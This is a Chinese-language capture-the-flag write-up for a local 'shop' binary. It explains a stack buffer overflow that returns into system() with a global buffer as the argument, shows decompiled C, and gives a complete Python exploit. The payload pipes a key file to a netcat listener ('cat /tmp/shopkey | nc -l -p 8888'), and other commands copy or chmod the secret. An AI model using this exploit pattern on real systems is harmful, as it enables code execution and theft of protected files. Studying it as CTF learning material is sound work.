首先看程序很明显会发现，接收到的串没有做长度校验，所以传递传递超过长度限制的就会直接溢出，覆盖返回值地址不解释，然后程序由于调用过system，所以GOT表中已经有了system，直接调用就好，至于参数，由于程序将我们的输入串strcpy到了一个全局变量中，那么我们直接就可以用这个全局变量当参数了，真是简直不能更水，ROP神马完全都不用了。

但是写了payload发现挂彩，于是乎仔细一看，程序在读入之后，调用这个getnum函数的时候崩掉了：

```c
int __cdecl getnum(char *input_buf){  unsigned int v1; // eax@1  char s[16]; // [sp+10h] [bp-28h]@1  size_t v4; // [sp+20h] [bp-18h]@1  int v5; // [sp+24h] [bp-14h]@1  size_t i; // [sp+28h] [bp-10h]@1  int v7; // [sp+2Ch] [bp-Ch]@1  v7 = 0;  v5 = 0;  v4 = 0;  v1 = time(0);  srand(v1);  memset(s, 0, 0x10u);  v4 = strlen(input_buf);  for ( i = 0; (signed int)i < (signed int)v4; ++i )  {    if ( input_buf[i] != 32 )      s[v5++] = input_buf[i];  }  if ( !strcmp(s, "apple") )  {    v7 = rand() % 1000;  }  else if ( !strcmp(s, "pear") )  {    v7 = rand() % 1000;  }  else if ( !strcmp(s, "orange") )  {    v7 = rand() % 1000;  }  else if ( !strcmp(s, "banana") )  {    v7 = rand() % 1000;  }  else if ( !strcmp(s, "peach") )  {    v7 = rand() % 1000;  }  else  {    v7 = -1;  }  return v7;}
```

我们可以发现，这里将输入字符串的除空格之外的字符存到了局部变量s中，于是乎，按照我们的输入，会导致这里也溢出，然后v4先被覆盖成一个很大的值，循环出不去，然后访问内存的时候就崩了。

那么我们只要想办法让溢出的时候，循环直接break就好，当然我们可以用\x00来截断，但是截断同时也会导致我们执行system的时候，里面的命令被截断，所以鉴于这里v4是signed int，那么我们最好的办法就是把v4覆盖成0xffffffff，即-1。

然后我们本地运行`system("cat /tmp/shopkey")`会发现，获取到的key是输出到了服务器端，而我们连接服务器的脚本是接收不到key的，因为这里和平常nc连接服务器不一样，这里的socket是这个程序自己控制的，除非我们直接调send，直接输出的东西只能在服务器程序那边看到，我们这里是收不到的。

然后为了将flag发回来，我当时的想法是执行命令`cat /tmp/shopkey | nc -l -p 8888`让程序监听端口，然后再开一个终端`nc 0.0.0.0 8888`就可以接收到flag了，然后就这么过了。

后来想了下，我们其实可以直接`cat /tmp/shopkey > /tmp/.test`输出到一个文件，然后这个文件有所有人读的权限，我们就可以用当前ctf帐号读取flag了，或者甚至可以直接`chmod a+r /tmp/shopkey`，不过这样容易让其他人也一个不小心就看到flag的说……

最后程序很简单：

```python
#!/usr/bin/env python
#encoding:utf-8

import socket

def NOPS(n):
    return ' ' * n

def RIGHT_PAD(s, n):
    return s + NOPS(n - len(s))

def l32(x):
    return ''.join([chr((x >> (i << 3)) & 0xff) for i in xrange(4)])

SOCK_PATH = '/home/wangyanfeng/shopinfo/si-socket'
BINSH_ADDR = 0x0804B0A0
SYSTEM_GOT = 0x08048670
LEN_TO_RET = 0x4c + 4

io = socket.socket(socket.AF_UNIX)
io.connect(SOCK_PATH)

payload = RIGHT_PAD('\xff' * 20 + '\ncat /tmp/shopkey | nc -l -p 8888\n', LEN_TO_RET) + l32(SYSTEM_GOT) + NOPS(4) + l32(BINSH_ADDR)
# payload = RIGHT_PAD('\xff' * 20 + '\ncat /tmp/shopkey > /tmp/.test\n', LEN_TO_RET) + l32(SYSTEM_GOT) + NOPS(4) + l32(BINSH_ADDR)
io.sendall(l32(len(payload)))
io.sendall(payload)
```

PS：这题如果要本地跑的话，需要新建目录`/home/wangyanfeng/shopinfo`，同时设置好权限，直接777最简单。
